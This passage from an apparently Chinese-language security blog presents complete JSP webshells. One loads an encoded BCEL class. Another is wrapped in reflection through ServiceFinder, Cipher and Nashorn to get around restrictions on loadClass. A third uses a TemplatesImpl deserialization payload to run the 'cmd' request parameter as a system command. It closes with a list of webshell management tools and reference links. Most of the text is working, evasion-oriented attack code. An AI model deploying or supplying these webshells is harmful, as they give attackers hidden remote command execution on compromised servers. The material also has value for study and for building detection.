    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A";
    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString()).getBytes());
%>
</body>
</html>
```

三梦师傅包装后的 JSP shell，可以用来绕过 loadClass

```java
<%@ page import="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.lang.reflect.Array" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.security.Provider.Service" %>
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.List" %>
<%@ page import="javax.activation.DataHandler" %>
<%@ page import="javax.activation.DataSource" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.CipherInputStream" %>
<%@ page import="javax.crypto.CipherSpi" %>
<%@ page import="jdk.nashorn.internal.objects.Global" %>
<%@ page import="jdk.nashorn.internal.objects.NativeString" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Paths" %>
<html>
<body>
<h2>BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP WebShell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("cmd").getBytes());
    Class serviceNameClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$ServiceName");
    Constructor serviceNameConstructor = serviceNameClass.getConstructor(String.class, URL.class);
    serviceNameConstructor.setAccessible(true);
    Object serviceName = serviceNameConstructor.newInstance(new String(new byte[] {36,36,66,67,69,76,36,36,36,108,36,56,98,36,73,36,65,36,65,36,65,36,65,36,65,36,65,36,65,36,56,100,85,36,53,98,87,36,84,87,36,85,36,102,101,36,79,36,98,57,36,99,99,48,36,56,99,36,53,99,36,56,50,36,100,99,36,98,52,36,98,54,36,102,54,36,56,50,36,69,36,85,82,36,98,53,90,36,98,57,84,107,36,97,48,36,119,53,36,109,36,114,36,73,77,105,107,36,116,36,99,57,36,110,36,77,36,115,36,57,57,116,50,36,82,121,106,36,102,102,36,56,100,36,99,102,36,102,54,36,110,97,36,57,53,36,100,53,36,51,101,36,102,54,36,99,49,36,55,102,36,100,50,36,51,102,81,36,102,97,36,57,100,73,36,67,107,36,113,36,97,101,54,36,120,36,100,57,36,57,51,36,98,100,36,99,102,36,98,101,36,55,99,36,102,98,36,51,98,103,36,99,102,121,36,102,51,36,99,102,36,101,102,36,55,102,36,67,36,102,56,36,77,36,72,36,71,36,36,36,101,50,36,56,101,36,56,54,89,36,68,36,53,100,36,98,56,36,97,51,99,36,99,101,36,99,48,36,51,99,36,87,52,36,55,99,36,97,49,36,102,52,36,98,98,36,100,100,36,98,56,36,56,55,36,95,117,36,100,99,87,74,36,100,50,36,99,48,36,111,36,57,54,36,77,36,55,99,36,56,53,36,72,36,71,36,97,50,120,104,36,101,48,36,82,36,57,54,36,57,53,36,102,56,36,100,97,36,99,48,99,36,97,52,52,36,97,99,104,88,53,36,81,36,99,51,36,84,36,68,36,68,88,83,36,101,50,36,104,36,106,36,101,98,36,103,36,100,50,36,71,70,36,98,48,97,36,101,48,36,118,54,53,108,105,36,102,56,86,36,109,36,98,97,36,54,48,36,57,55,109,36,101,102,36,97,101,36,52,48,36,117,36,51,101,36,98,57,36,118,36,81,36,53,101,116,36,102,50,82,36,97,48,36,95,101,36,57,55,36,101,53,106,36,97,100,36,57,52,36,57,53,36,101,101,36,56,54,36,57,53,36,122,36,100,50,36,83,75,57,57,36,97,98,36,98,56,105,36,98,57,36,98,54,36,100,50,36,53,98,36,99,54,36,98,48,36,98,55,107,87,36,57,53,36,102,55,36,99,54,36,97,101,36,120,101,36,100,101,36,98,100,105,36,57,53,36,57,101,36,53,100,36,98,102,53,36,95,36,97,48,36,95,36,101,52,36,56,97,36,101,100,36,98,99,36,53,101,36,97,57,36,97,50,36,99,50,36,102,55,36,97,99,36,88,86,36,97,50,104,36,57,53,36,76,36,56,57,36,98,52,36,101,55,36,100,97,36,101,53,36,67,36,98,100,66,36,98,57,82,36,53,101,36,97,48,36,99,55,36,36,87,106,36,107,36,56,100,36,100,50,36,119,36,74,36,77,53,36,106,109,36,116,36,98,49,36,55,99,106,36,97,54,111,111,36,98,54,36,98,54,36,98,51,36,112,36,53,100,36,57,57,95,36,57,55,86,36,53,101,36,98,97,36,67,36,97,51,36,116,36,56,101,36,99,57,36,99,48,36,75,36,55,100,36,99,51,36,97,99,77,116,66,36,57,101,36,97,52,36,102,51,36,101,98,36,83,36,97,52,36,98,51,36,97,102,36,56,48,36,100,51,36,101,53,36,53,99,36,100,53,36,72,36,57,49,36,97,99,36,100,57,69,36,51,102,36,100,98,36,100,56,36,90,36,55,99,36,97,100,36,114,36,101,53,36,57,98,36,102,54,36,97,99,36,100,99,36,102,51,36,86,36,97,98,36,101,50,119,36,99,100,36,78,36,101,50,36,57,101,104,36,99,56,36,102,56,52,36,97,55,36,70,36,56,99,36,98,52,83,115,115,36,102,50,36,56,49,36,101,100,36,100,51,36,85,36,54,48,98,70,36,114,53,36,102,49,36,107,36,36,36,74,36,56,99,36,98,99,36,97,51,36,65,36,53,98,83,36,120,51,36,98,54,51,67,36,97,54,36,102,50,36,98,54,36,97,98,36,101,49,36,51,98,36,84,36,100,98,36,102,56,36,53,101,36,97,48,36,102,102,36,101,100,36,81,36,84,36,51,102,36,101,48,71,36,78,36,99,102,76,36,102,99,36,56,52,113,36,102,50,36,98,55,36,98,56,36,98,50,100,36,99,50,66,86,67,36,99,101,68,36,107,36,99,52,36,98,54,99,36,97,50,36,56,48,36,53,100,85,36,100,50,36,100,54,36,98,48,103,36,101,50,57,36,56,97,36,115,74,36,117,107,112,76,84,36,102,48,36,98,51,36,99,48,112,103,36,100,97,72,65,36,72,36,101,50,36,57,98,107,36,119,36,57,100,36,95,36,97,97,36,115,36,51,99,100,36,99,57,36,97,99,36,110,48,36,100,56,36,56,49,88,36,84,53,36,53,99,36,100,50,36,102,48,36,99,50,36,99,52,36,51,101,36,53,101,36,57,50,36,98,56,36,65,36,90,36,56,49,36,55,101,36,57,101,100,36,102,55,100,36,99,101,107,103,36,74,36,87,36,78,54,36,55,101,80,36,102,53,36,113,77,36,51,100,36,70,36,101,57,36,97,100,36,98,57,78,69,36,98,97,36,100,101,36,56,49,36,99,48,36,57,53,36,102,56,36,100,57,36,102,51,52,36,100,57,36,101,57,36,56,56,69,36,97,100,74,69,36,57,54,121,36,99,97,36,97,54,36,102,102,87,36,99,52,36,101,57,36,97,54,36,57,98,109,36,54,48,36,99,100,36,55,100,36,101,100,36,97,101,36,99,97,36,56,97,36,101,53,90,36,57,101,67,36,97,50,116,36,99,102,105,122,36,76,36,57,99,36,56,102,119,36,97,99,36,100,97,36,101,99,36,97,97,36,99,99,36,101,56,36,106,70,36,116,36,100,54,36,121,111,36,57,55,99,36,83,98,36,76,36,67,36,102,51,36,106,36,56,48,108,36,98,102,36,84,36,53,98,36,109,36,99,55,36,100,57,36,99,99,36,75,36,105,51,36,57,98,36,97,52,36,122,36,55,102,36,98,102,88,76,36,107,120,74,36,106,36,56,100,119,36,75,36,57,101,36,100,99,78,36,75,68,36,101,50,36,100,98,73,53,36,101,55,36,68,36,97,55,36,70,36,100,55,107,101,36,99,102,36,36,36,98,49,71,36,56,51,36,102,56,78,36,57,52,36,97,49,36,52,48,103,36,122,36,98,51,36,57,97,36,122,36,102,57,82,36,101,54,36,69,36,115,36,102,101,36,56,51,78,110,85,78,86,36,97,98,36,102,51,36,56,49,74,36,122,36,112,79,36,51,99,36,120,36,70,54,36,55,99,36,97,52,36,53,100,36,101,100,36,99,99,36,100,99,36,98,55,36,55,98,121,107,65,36,102,53,48,120,36,98,97,36,100,52,36,103,36,55,100,101,36,100,53,36,86,36,88,36,118,36,102,102,36,70,36,100,48,87,36,110,36,36,36,99,102,36,57,102,36,100,101,36,78,36,100,55,36,99,97,36,99,57,36,65,36,57,56,36,101,53,36,98,50,36,116,36,76,36,101,97,36,100,99,36,101,98,36,100,99,36,100,56,36,97,97,36,97,52,36,97,97,36,57,97,36,101,101,36,100,48,36,100,53,50,36,51,101,36,99,52,36,70,36,98,101,36,57,97,36,100,53,36,97,55,36,76,66,77,51,36,101,53,36,102,98,36,100,52,36,83,36,55,99,36,75,36,51,101,36,112,83,36,78,36,56,56,36,100,55,36,102,101,36,102,50,36,72,36,57,52,81,36,100,102,36,100,56,36,56,51,36,99,98,36,57,52,102,36,100,51,36,56,49,36,118,36,51,101,36,101,50,83,36,99,55,36,99,55,36,101,100,36,54,48,36,102,49,36,57,48,36,100,54,36,117,109,36,98,102,36,107,36,97,49,36,120,36,100,51,36,52,48,36,101,56,113,36,121,36,55,99,36,56,56,72,36,101,97,36,73,36,100,49,76,36,99,98,114,36,98,53,36,79,36,101,100,55,36,101,56,36,57,52,36,98,49,110,36,56,97,36,51,97,36,56,99,36,100,48,36,108,36,56,56,36,107,36,97,50,36,101,55,36,81,102,36,68,36,101,55,86,36,79,36,100,49,36,55,98,36,97,100,36,56,101,36,98,101,36,51,97,36,102,97,87,36,56,102,48,36,99,48,36,97,56,88,102,36,98,97,36,56,49,36,99,49,36,71,36,99,101,36,99,102,36,56,53,36,99,55,36,99,50,117,36,77,101,36,101,54,36,111,36,55,102,36,110,54,53,36,87,81,36,118,36,56,54,36,118,36,98,54,36,53,101,36,106,36,102,102,36,102,100,36,75,122,36,56,97,36,57,57,71,36,97,55,36,57,56,36,101,102,36,81,99,36,53,98,36,97,102,36,56,57,71,36,56,55,36,68,36,57,55,87,67,36,99,56,36,99,55,36,55,102,36,56,51,36,97,56,36,56,49,36,53,101,90,36,102,98,36,118,36,72,48,36,99,98,36,57,98,100,36,74,36,56,51,36,98,99,53,36,56,54,36,102,56,36,100,101,36,90,36,97,54,36,101,102,36,70,122,36,56,102,36,97,50,36,56,97,49,36,99,101,36,102,57,69,36,102,99,66,74,84,36,97,102,36,56,102,36,97,48,36,100,49,36,100,102,36,99,50,36,116,36,89,103,36,99,101,89,36,100,99,36,99,54,36,86,36,102,101,36,101,98,98,36,101,99,85,76,36,109,36,99,101,36,101,99,79,36,90,57,36,56,57,36,118,36,56,52,36,102,57,36,107,36,56,98,36,100,49,36,51,97,78,36,79,36,97,97,36,100,52,36,97,101,97,36,100,97,71,36,98,49,36,56,102,36,90,36,57,50,36,75,36,55,99,36,99,97,36,100,102,36,69,36,99,50,36,99,55,36,77,36,56,56,104,36,98,56,36,97,101,36,101,49,36,56,54,36,102,102,36,98,100,36,97,57,36,102,49,36,57,97,36,99,52,49,36,99,98,36,75,90,36,56,49,36,97,52,36,56,54,36,53,98,97,36,71,36,100,101,36,102,54,36,97,57,36,102,102,36,102,99,95,36,98,53,36,51,100,36,102,101,36,116,74,36,72,36,65,36,65}), null);
    Object serviceNameArray = Array.newInstance(serviceNameClass, 1);
    Array.set(serviceNameArray, 0, serviceName);
    Class lazyIteratorClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$LazyIterator");
    Constructor lazyIteratorConstructor = lazyIteratorClass.getDeclaredConstructors()[1];
    lazyIteratorConstructor.setAccessible(true);
    Object lazyIterator = lazyIteratorConstructor.newInstance(String.class, new ClassLoader());
    Field namesField = lazyIteratorClass.getDeclaredField("names");
    namesField.setAccessible(true);
    namesField.set(lazyIterator, serviceNameArray);
    Constructor cipherConstructor = Cipher.class
            .getDeclaredConstructor(CipherSpi.class, Service.class, Iterator.class, String.class,
                    List.class);
    cipherConstructor.setAccessible(true);
    Cipher cipher = (Cipher) cipherConstructor.newInstance(null, null, lazyIterator, null, null);
    Field opmodeField = Cipher.class.getDeclaredField("opmode");
    opmodeField.setAccessible(true);
    opmodeField.set(cipher, 1);
    Field initializedField = Cipher.class.getDeclaredField("initialized");
    initializedField.setAccessible(true);
    initializedField.set(cipher, true);
    CipherInputStream cipherInputStream = new CipherInputStream(
            new ByteArrayInputStream(new byte[0]), cipher);
    Class xmlDataSourceClass = Class
            .forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
    Constructor xmlDataSourceConstructor = xmlDataSourceClass.getDeclaredConstructors()[0];
    xmlDataSourceConstructor.setAccessible(true);
    DataSource xmlDataSource = (DataSource) xmlDataSourceConstructor
            .newInstance("", cipherInputStream);
    DataHandler dataHandler = new DataHandler(xmlDataSource);
    Base64Data base64Data = new Base64Data();
    Field dataHandlerField = Base64Data.class.getDeclaredField("dataHandler");
    dataHandlerField.setAccessible(true);
    dataHandlerField.set(base64Data, dataHandler);
    Constructor NativeStringConstructor = NativeString.class
            .getDeclaredConstructor(CharSequence.class, Global.class);
    NativeStringConstructor.setAccessible(true);
    NativeString nativeString = (NativeString) NativeStringConstructor
            .newInstance(base64Data, new Global(new Context(new Options(""), null, null)));
    try {
        new HashMap<>().put(nativeString, "111");
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>
```

Templates
---------

我们在反序列化中所使用的就是 Templates 的方式，实际上就是因为它简单，前面更复杂的都学习过了，这里这个我们熟悉的就直接放 shell 了，同样，详细分析可见我 [之前的笔记](http://www.whrizyl819.xyz/2022/03/21/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81)

```java
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ObjectInputStream" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.File" %>
<html>
<body>
<h2>利用TemplatesImpl反序列化的JSP WebShell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Files.write(Paths.get(tmp + File.separator + "cmd"), request.getParameter("cmd").getBytes());
    TemplatesImpl t = (TemplatesImpl) ((Map) new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABcHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAC/DK/rq+AAAANACYCgAjAE0IAE4IAE8KAFAAUQcAUgoAUwBUCgBVAFYKAAUAVwgAWAgAWQoABQBaCABbCgAFAFwKAFAAXQoAXgBfBwBgCgAQAE0HAGEHAGIKABMAYwoAEgBkCgASAGUKABAAZggAZwcAaAoAVQBpCgBVAGoKABAAawoABQBsBwBtCgBVAG4HAG8KACAAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAlpbnB1dEZpbGUBABJMamF2YS9sYW5nL1N0cmluZzsBAApvdXRwdXRGaWxlAQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAWUBABVMamF2YS9sYW5nL1Rocm93YWJsZTsBAAR0aGlzAQATTFRocmVlZHIzYW1TY3JpcHQyOwEADVN0YWNrTWFwVGFibGUHAHEHAFIHAHMHAGAHAGEHAG8BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAdAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRocmVlZHIzYW1TY3JpcHQyLmphdmEMACQAJQEACC90bXAvY21kAQALL3RtcC9yZXN1bHQHAHUMAHYAdwEAEGphdmEvbGFuZy9TdHJpbmcHAHgMAHkAegcAewwAfAB9DAAkAH4BAAElAQAADAB/AIABAAEgDACBAIIMAIMAhAcAhQwAhgCHAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJACIDAAkAIkMAIoAiwwAjACNAQABCgEAGGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbgwAjgCPDACQAJEMAJIAiwwAkwCUAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uDACVAJYBABNqYXZhL2xhbmcvVGhyb3dhYmxlDACXACUBABFUaHJlZWRyM2FtU2NyaXB0MgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lucHV0U3RyZWFtAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQATamF2YS9uaW8vZmlsZS9QYXRocwEAA2dldAEAOyhMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9maWxlL1BhdGg7AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgEABShbQilWAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAGZXhpc3RzAQAyKExqYXZhL25pby9maWxlL1BhdGg7W0xqYXZhL25pby9maWxlL0xpbmtPcHRpb247KVoBAAZkZWxldGUBABcoTGphdmEvbmlvL2ZpbGUvUGF0aDspVgEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFd3JpdGUBAEcoTGphdmEvbmlvL2ZpbGUvUGF0aDtbQltMamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAD3ByaW50U3RhY2tUcmFjZQAhACIAIwAAAAAAAwABACQAJQABACYAAAGLAAUABwAAAKUqtwABEgJMEgNNuAAEuwAFWSsDvQAFuAAGuAAHtwAIEgkSCrYACxIMtgANtgAOtgAPTrsAEFm3ABE6BLsAElm7ABNZLbcAFLcAFToFGQW2ABZZOgbGABMZBBkGtgAXEhi2ABdXp//oLAO9AAW4AAYDvQAZuAAamQAOLAO9AAW4AAa4ABssA70ABbgABhkEtgActgAdA70AHrgAH1enAAhMK7YAIbEAAQAEAJwAnwAgAAMAJwAAAD4ADwAAABEABAATAAcAFAAKABUAMgAWADsAFwBMABkAVwAaAGcAHAB5AB0AhAAeAJwAIQCfAB8AoAAgAKQAIgAoAAAAUgAIAAcAlQApACoAAQAKAJIAKwAqAAIAMgBqACwALQADADsAYQAuAC8ABABMAFAAMAAxAAUAVABIADIAKgAGAKAABAAzADQAAQAAAKUANQA2AAAANwAAADAABf8ATAAGBwA4BwA5BwA5BwA6BwA7BwA8AAD8ABoHADkc/wAaAAEHADgAAQcAPQQAAQA+AD8AAgAmAAAAPwAAAAMAAAABsQAAAAIAJwAAAAYAAQAAACcAKAAAACAAAwAAAAEANQA2AAAAAAABAEAAQQABAAAAAQBCAEMAAgBEAAAABAABAEUAAQA+AEYAAgAmAAAASQAAAAQAAAABsQAAAAIAJwAAAAYAAQAAAC0AKAAAACoABAAAAAEANQA2AAAAAAABAEAAQQABAAAAAQBHAEgAAgAAAAEASQBKAAMARAAAAAQAAQBFAAEASwAAAAIATHB0AAp0aHJlZWRyM2FtcHcBAHh4"))).readObject()).get("p");
    try { t.getOutputProperties();} catch (Exception e) {}
    response.getOutputStream().write(Files.readAllBytes(Paths.get(tmp + File.separator + "result")));
%>
</body>
</html>
```

可以看出这里也是利用了 VersionHelper 包装的

0x05 Webshell 管理工具
==================

知名的一些WebShell管理工具：

| WebShell名称 | 开发语言 | 地址 |
|---|---|---|
| 中国菜刀（Chopper） | C | [https://github.com/raddyfiy/caidao-official-version](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fraddyfiy%2Fcaidao-official-version) |
| 中国蚁剑（AntSword） | JS | [https://github.com/AntSwordProject/antSword](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FantSword) |
| 冰蝎（Behinder） | Java | [https://github.com/rebeyond/Behinder](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frebeyond%2FBehinder) |
| 哥斯拉（Godzilla） | Java | [https://github.com/BeichenDream/Godzilla](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FBeichenDream%2FGodzilla) |
| C刀（Cknife） | Java | [https://github.com/Chora10/Cknife](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FChora10%2FCknife) |
| Weevely | Python | [https://github.com/epinna/weevely3](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fepinna%2Fweevely3) |

相关学习文章：

<https://www.jianshu.com/p/7e013eada933>

<https://www.jianshu.com/p/4a36fec7d080>

0x06 参考文章 / 项目
==============

<https://github.com/threedr3am/JSP-WebShells/>

<https://zhuanlan.zhihu.com/p/183902092>

<https://www.jianshu.com/p/bdbe03f2c7b3>

<https://www.jianshu.com/p/44a09db6565c>

师傅们真的太叼了